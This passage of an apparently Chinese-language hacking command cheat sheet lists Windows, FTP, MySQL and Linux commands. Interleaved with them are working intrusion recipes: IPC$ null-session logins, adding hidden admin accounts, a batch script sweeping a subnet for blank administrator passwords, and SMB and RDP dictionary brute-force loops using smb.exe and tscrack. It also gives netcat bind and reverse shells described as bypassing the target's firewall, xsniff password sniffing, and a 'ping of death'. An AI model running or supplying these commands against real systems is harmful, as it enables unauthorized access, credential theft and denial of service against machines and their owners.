</strong>查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间<br><strong>date /t 、 time /t </strong>使用此参数即”DATE/T”、”TIME/T”将只显示当前日期和时间，而不必输入新日期和时间<br><strong>set</strong> 指定环境变量名称=要指派给变量的字符 设置环境变量<br>set 显示当前所有的环境变量<br>set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量<br>pause 暂停批处理程序，并显示出：请按任意键继续….<br>if 在批处理程序中执行条件处理（更多说明见if命令及变量）<br>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：”：start”标签）<br>call 路径\\批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）<br>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）<br>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置<br>echo 信息 在屏幕上显示出信息<br>echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中<br>findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello<br>find 文件名 查找某文件<br>title 标题名字 更改CMD窗口标题名字<br>color 颜色值 设置cmd控制台前景和背景颜色；0＝黑、1＝蓝、2＝绿、3＝浅绿、4＝红、5＝紫、6＝黄、7=白、8=灰、9=淡蓝、A＝淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白<br>prompt 名称 更改cmd.exe的显示的命令提示符(把C:\\、D:\\统一改为：EntSky\\ )<br>net use \\ip\\ipc$ “ “ /user:” “ 建立IPC空链接<br>net use \\ip\\ipc$ “密码” /user:”用户名” 建立IPC非空链接<br>net use h: \\ip\\c$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:<br>net use h: \\ip\\c$ 登陆后映射对方C：到本地为H:<br>net use \\ip\\ipc$ /del 删除IPC链接<br>net use h: /del 删除映射对方到本地的为H:的映射<br>net user 用户名　密码　/add 建立用户<br>net user guest /active:yes 激活guest用户<br>net user 查看有哪些用户<br>net user 帐户名 查看帐户的属性<br>net localgroup administrators 用户名 /add 把”用户”添加到管理员中使其具有管理员权限,注意：administrator后加s用复数<br>net start 查看开启了哪些服务<br>net start 服务名　 开启服务；(如:net start telnet， net start schedule)<br>net stop 服务名 停止某服务<br>net time \\目标ip 查看对方时间<br>net time \\目标ip /set 设置本地计算机时间与”目标IP”主机的时间同步,加上参数/yes可取消确认信息<br>net view 查看本地局域网内开启了哪些共享<br>net view \\ip 查看对方局域网内开启了哪些共享<br>net config 显示系统网络设置<br>net logoff 断开连接的共享<br>net pause 服务名 暂停某服务<br>net send ip “文本信息” 向对方发信息<br>net ver 局域网内正在使用的网络连接类型和信息<br>net share 查看本地开启的共享<br>net share ipc$ 开启ipc$共享<br>net share ipc$ /del 删除ipc$共享<br>net share c$ /del 删除C：共享<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>net password 密码 更改系统登陆密码<br>netstat -a 查看开启了哪些端口,常用netstat -an<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>netstat -v 查看正在进行的工作<br>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）<br>netstat -s 查看正在使用的所有协议使用情况<br>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写<br>tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：”-w数字”用于设置超时间隔。<br>ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)<br>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数”/all”显示全部配置信息<br>tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如”DEL/AR <em>.</em>“表示删除当前目录下所有只读文件，”DEL/A-S <em>.</em>“表示删除当前目录下除系统文件以外的所有文件</p>\n<p>#2 二：<br>del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）<br>move 盘符\\路径\\要移动的文件名　存放移动文件的路径\\移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖<br>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令<br>at id号 开启已注册的某个计划任务<br>at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止<br>at id号 /delete 停止某个已注册的计划任务<br>at 查看所有的计划任务<br>at \\ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机<br>finger username @host 查看最近有哪些用户登陆<br>telnet ip 端口 远和登陆服务器,默认端口为23<br>open ip 连接到IP（属telnet登陆后的命令）<br>telnet 在本机上直接键入telnet 将进入本机的telnet<br>copy 路径\\文件名1　路径\\文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件<br>copy c:\\srv.exe \\ip\\admin$ 复制本地c:\\srv.exe到对方的admin下<br>cppy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件<br>ver 在DOS窗口下显示版本信息<br>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）<br>format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS<br>md　目录名 创建目录<br>replace 源文件　要替换文件的目录 替换文件<br>ren 原文件名　新文件名 重命名文件名<br>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称<br>type 文件名 显示文本文件的内容<br>more 文件名 逐屏显示输出文件<br>doskey 要锁定的命令＝字符<br>doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=<br>taskmgr 调出任务管理器<br>chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误<br>tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口<br>exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe<br>path 路径\\可执行文件的文件名 为可执行文件设置一个路径。<br>cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?<br>regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；<br>regedit /e 注册表文件名 导出注册表<br>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D:\\test.txt /D pub 设定d:\\test.txt拒绝pub用户访问。<br>cacls 文件名 查看文件的访问用户权限列表<br>REM 文本内容 在批处理文件中添加注解<br>netsh 查看或更改本地网络配置情况</p>\n<p>#4 四：<br>IIS服务命令：<br>iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）<br>iisreset /start或stop 启动（停止）所有Internet服务<br>iisreset /restart 停止然后重新启动所有Internet服务<br>iisreset /status 显示所有Internet服务状态<br>iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动<br>iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机<br>iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务<br>iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。<br>FTP 命令： (后面有详细说明内容)<br>ftp的命令行格式为:<br>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。<br>－d 使用调试方式。<br>－n 限制ftp的自动登录,即不使用.netrc文件。<br>－g 取消全局文件名。<br>help [命令] 或 ？[命令] 查看命令说明<br>bye 或 quit 终止主机FTP进程,并退出FTP管理方式.<br>pwd 列出当前远端主机目录<br>put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中<br>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中<br>mget [remote-files] 从远端主机接收一批文件至本地主机<br>mput local-files 将本地主机中一批文件传送至远端主机<br>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件<br>ascii 设定以ASCII方式传送文件(缺省值)<br>bin 或 image 设定以二进制方式传送值)<br>bin 或 image 设定以二进制方式传送文件<br>bell 每完成一次文件传送,报警提示<br>cdup 返回上一级目录<br>close 中断与远程服务器的ftp会话(与open对应)<br>open host[port] 建立指定ftp服务器连接,可指定连接端口<br>delete 删除远端主机中的文件<br>mdelete [remote-files] 删除一批文件<br>mkdir directory-name 在远端主机中建立目录<br>rename [from] [to] 改变远端主机中的文件名<br>rmdir directory-name 删除远端主机中的目录<br>status 显示当前FTP的状态<br>system 显示远端主机系统类型<br>user user-name [password] [account] 重新以别的用户名登录远端主机<br>open host [port] 重新建立一个新的连接<br>prompt 交互提示模式<br>macdef 定义宏命令<br>lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录<br>chmod 改变远端主机的文件权限<br>case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母<br>cd remote－dir 进入远程主机目录<br>cdup 进入远程主机目录的父目录<br>! 在本地机中执行交互shell，exit回到ftp环境,如!ls＊.zip<br>MYSQL 命令：<br>mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。<br>（例：mysql -h110.110.110.110 -Uroot -P123456<br>注:u与root可以不用加空格，其它也一样）<br>exit 退出MYSQL<br>mysqladmin -u用户名 -p旧密码 password 新密码 修改密码<br>grant select on 数据库.<em> to 用户名@登录主机 identified by \\”密码\\”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）<br>show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。<br>use mysql；<br>show tables; 显示库中的数据表<br>describe 表名; 显示数据表的结构<br>create database 库名; 建库<br>use 库名；<br>create table 表名 (字段设定列表)； 建表<br>drop database 库名;<br>drop table 表名； 删库和删表<br>delete from 表名; 将表中记录清空<br>select </em> from 表名; 显示表中的记录<br>mysqldump –opt school&gt;school.bbb 备份数据库：（命令在DOS的\\mysql\\bin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。<br>win2003系统下新增命令（实用部份）：<br>shutdown /参数 关闭或重启本地或远程主机。<br>参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。<br>例：shutdown /r /t 0 立即重启本地主机（无延时）<br>taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。<br>参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。<br>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。<br>参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</p>\n<p>#6 六：<br>Linux系统下基本命令： 要区分大小写<br>uname 显示版本信息（同win2K的 ver）<br>dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）<br>pwd 查询当前所在的目录位置<br>cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。<br>cat 文件名 查看文件内容<br>cat &gt;abc.txt 往abc.txt文件中写上内容。<br>more 文件名 以一页一页的方式显示一个文本文件。<br>cp 复制文件<br>mv 移动文件<br>rm 文件名 删除文件，rm -a 目录名删除目录及子目录<br>mkdir 目录名 建立目录<br>rmdir 删除子目录，目录内没有文档。<br>chmod 设定档案或目录的存取权限<br>grep 在档案中查找字符串<br>diff 档案文件比较<br>find 档案搜寻<br>date 现在的日期、时间<br>who 查询目前和你使用同一台机器的人以及Login时间地点<br>w 查询目前上机者的详细资料<br>whoami 查看自己的帐号名称<br>groups 查看某人的Group<br>passwd 更改密码<br>history 查看自己下过的命令<br>ps 显示进程状态<br>kill 停止某进程<br>gcc 黑客通常用它来编译C语言写的文件<br>su 权限转换为指定使用者<br>telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br>ftp ftp连接上某服务器（同win2K）<br>附：批处理命令与变量<br>1：for命令及变量 基本格式：<br>FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。<br>批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use \\ip\\ipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3<br>(set):指定一个或一组文件，可使用通配符，如：(D:\\user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；”(1 -1 254)”说明：即从254到1 }<br>command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开<br>command_parameters：为特定命令指定参数或命令行开关<br>IN (set)：指在(set)中取值；DO command ：指执行command<br>参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:\\pass.txt)时 }。<br>用法举例：<br>@echo off<br>echo 用法格式：test.bat <em>.</em>.<em> &gt; test.txt<br>for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use \\%1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt<br>存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。<br>/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：</em>.<em>.</em>为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。<br>@echo off<br>echo 用法格式：ok.bat ip<br>FOR /F %%i IN (D:\\user.dic) DO smb.exe %1 %%i D:\\pass.dic 200<br>存为：ok.exe 说明：输入一个IP后，用字典文件d:\\pass.dic来暴解d:\\user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。<br>2：if命令及变量 基本格式：<br>IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为”真”。<br>例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。<br>0 指发现并成功执行（真）；1 指没有发现、没执行（假）。<br>IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。<br>例：”if “%2%”==”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “）<br>IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。<br>例：”if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。</p>\n<p>IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。<br>当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：”if exist test.txt. else echo test.txt.missing “，注意命令中的”.”</p>\n<p>（二）系统外部命令(均需下载相关工具)：<br>1、瑞士军刀：nc.exe<br>参数说明：<br>-h 查看帮助信息<br>-d 后台模式<br>-e prog程序重定向，一但连接就执行［危险］<br>-i secs延时的间隔<br>-l 监听模式，用于入站连接<br>-L 监听模式，连接天闭后仍然继续监听，直到CTR+C<br>-n IP地址，不能用域名<br>-o film记录16进制的传输<br>-p[空格]端口 本地端口号<br>-r 随机本地及远程端口<br>-t 使用Telnet交互方式<br>-u UDP模式<br>-v 详细输出，用-vv将更详细<br>-w数字 timeout延时间隔<br>-z 将输入，输出关掉（用于扫锚时）<br>基本用法：<br>nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口<br>nc -l -p 80 开启本机的TCP 80端口并监听<br>nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口<br>nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口<br>nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口<br>高级用法：<br>nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止<br>nc -L -p 80 &gt; c:\\log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:\\log.txt<br>nc -L -p 80 &lt; c:\\honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中，亦可起到传送文件作用<br>type.exe c:\\honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:\\honeyport.txt中内容送入管道中,亦可起到传送文件作用<br>本机上用：nc -l -p 本机端口<br>在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 <em>win2K<br>nc -e /bin/sh 本机IP -p 本机端口 </em>linux,unix 反向连接突破对方主机的防火墙<br>本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称<br>在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机<br>备 注：<br>| 管道命令<br>&lt; 或 &gt; 重定向命令。”&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令<br>＠ 表示执行＠后面的命令，但不会显示出来（后台执行）；例：＠dir c:\\winnt &gt;&gt; d:\\log.txt 意思是：后台执行dir，并把结果存在d:\\log.txt中 </p>\n<blockquote>\n<p>与&gt;&gt;的区别 　“&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。<br>如：@dir c:\\winnt &gt;&gt; d:\\log.txt和@dir c:\\winnt &gt; d:\\log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</p>\n</blockquote>\n<p>#8 八：<br>2、扫锚工具：xscan.exe<br>基本格式<br>xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始IP到终止IP”段的所有主机信息<br>xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机IP列表文件名”中的所有主机信息<br>检测项目<br>-active 检测主机是否存活<br>-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）<br>-port 检测常用服务的端口状态<br>-ftp 检测FTP弱口令<br>-pub 检测FTP服务匿名用户写权限<br>-pop3 检测POP3-Server弱口令<br>-smtp 检测SMTP-Server漏洞<br>-sql 检测SQL-Server弱口令<br>-smb 检测NT-Server弱口令<br>-iis 检测IIS编码/解码漏洞<br>-cgi 检测CGI漏洞<br>-nasl 加载Nessus攻击脚本<br>-all 检测以上所有项目<br>其它选项<br>-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过”-l”参数获取<br>-l 显示所有网络适配器<br>-v 显示详细扫描进度<br>-p 跳过没有响应的主机<br>-o 跳过没有检测到开放端口的主机<br>　 -t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10<br>-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)<br>用法示例<br>xscan -host 192.168.1.1-192.168.255.255 -all -active -p　 检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机<br>xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机<br>xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测”hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机<br>3、命令行方式嗅探器: xsniff.exe<br>可捕获局域网内FTP/SMTP/POP3/HTTP协议密码<br>参数说明<br>-tcp 输出TCP数据报<br>-udp 输出UDP数据报<br>-icmp 输出ICMP数据报<br>-pass 过滤密码信息<br>-hide 后台运行<br>-host 解析主机名<br>-addr IP地址 过滤IP地址<br>-port 端口 过滤端口<br>-log 文件名 将输出保存到文件<br>-asc 以ASCII形式输出<br>-hex 以16进制形式输出<br>用法示例<br>xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中<br>xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出<br>4、终端服务密码破解: tscrack.exe<br>参数说明<br>-h 显示使用帮助<br>-v 显示版本信息<br>-s 在屏幕上打出解密能力<br>-b 密码错误时发出的声音<br>-t 同是发出多个连接（多线程）<br>-N Prevent System Log entries on targeted server<br>-U 卸载移除tscrack组件<br>-f 使用－f后面的密码<br>-F 间隔时间（频率）<br>-l 使用－l后面的用户名<br>-w 使用－w后面的密码字典<br>-p 使用－p后面的密码<br>-D 登录主页面<br>用法示例<br>tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码<br>tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户<br>@if not exist ipcscan.txt goto noscan<br>@for /f “tokens=1 delims= “ %%i in (3389.txt) do call hack.bat %%i<br>nscan<br>@echo 3389.txt no find or scan faild<br>(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)<br>3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat<br>@if not exist tscrack.exe goto noscan<br>@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt<br>:noscan<br>@echo tscrack.exe no find or scan faild<br>(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)<br>hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。<br>5、其它：<br>Shutdown.exe<br>Shutdown \\IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）<br>fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）<br>fpipe -l 80 -s 1029 -r 80 <a href=\"http://www.sina.com.cn\" target=\"_blank\" rel=\"noopener\">www.sina.com.cn</a> 当有人扫锚你的80端口时，他扫到的结果会完全是<a href=\"http://www.sina.com.cn的主机信息\" target=\"_blank\" rel=\"noopener\">www.sina.com.cn的主机信息</a><br>Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。<br>OpenTelnet.exe (远程开启telnet工具)<br>opentelnet.exe \\IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet \\ip 连接上对方。<br>NTLM认证方式：０：不使用NTLM身份验证；１：先尝试NTLM身份验证，如果失败，再使用用户名和密码；２：只使用NTLM身份验证。<br>ResumeTelnet.exe (OpenTelnet附带的另一个工具)<br>resumetelnet.exe \\IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。<br>6、FTP命令详解：<br>FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。<br>FTP的命令行格式为：<br>ftp -v -d -i -n -g [主机名] ，其中<br>-v 显示远程服务器的所有响应信息；<br>-n 限制ftp的自动登录，即不使用；.n etrc文件；<br>-d 使用调试方式；<br>-g 取消全局文件名。</p>\n<p>FTP使用的内部命令如下(中括号表示可选项):<br>1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls<em>.zip<br>2.$ macro-ame[args]： 执行宏定义macro-name。<br>3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。<br>4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。<br>5.ascii：使用ascii类型传输方式。<br>6.bell：每个命令执行完毕后计算机响铃一次。<br>7.bin：使用二进制文件传输方式。<br>8.bye：退出ftp会话过程。<br>9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。<br>10.cd remote-dir：进入远程主机目录。<br>11.cdup：进入远程主机目录的父目录。<br>12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。<br>13.close：中断与远程服务器的ftp会话(与open对应)。<br>14.cr：使用asscii方式传输文件时，将回车换行转换为回行。<br>15.delete remote-file：删除远程主机文件。<br>16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。<br>17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。<br>18.disconnection：同close。<br>19.form format：将文件传输方式设置为format，缺省为file方式。<br>20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。<br>21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。<br>22.hash：每传输1024字节，显示一个hash符号(#)。<br>23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。<br>25.image：设置二进制传输方式(同binary)。<br>26.lcd[dir]：将本地工作目录切换至dir。<br>27.ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。<br>28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。<br>29.mdelete[remote-file]：删除远程主机文件。<br>30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir </em>.o.*.zipoutfile 。<br>31.mget remote-files：传输多个远程文件。<br>32.mkdir dir-name：在远程主机中建一目录。<br>33.mls remote-file local-file：同nlist，但可指定多个文件名。<br>34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。<br>35.modtime file-name：显示远程主机文件的最后修改时间。<br>36.mput local-file：将多个文件传输至远程主机。<br>37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。<br>38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。<br>39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。<br>40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。<br>41.open host[port]：建立指定ftp服务器连接，可指定连接端口。<br>42.passive：进入被动传输方式。<br>43.prompt：设置多个文件传输时的交互提示。<br>44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。<br>45.put local-file[remote-file]：将本地文件local-file传送至远程主机。<br>46.pwd：显示远程主机的当前工作目录。<br>47.quit：同bye，退出ftp会话。<br>48.quote arg1，arg2…：将参数逐字发至远程ftp服务器，如：quote syst.<br>49.recv remote-file[local-file]：同get。<br>50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。<br>51.rhelp[cmd-name]：请求获得远程主机的帮助。<br>52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。<br>53.rename[from][to]：更改远程主机文件名。<br>54.reset：清除回答队列。<br>55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。<br>56.rmdir dir-name：删除远程主机目录。<br>57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。<br>58.send local-file[remote-file]：同put。<br>59.sendport：设置PORT命令的使用。<br>60.site arg1，arg2…：将参数作为SITE命令逐字发送至远程ftp主机。<br>61.size file-name：显示远程主机文件大小，如：site idle 7200。<br>62.status：显示当前ftp状态。<br>63.struct[struct-name]：将文件传输结构设置为struct-name， 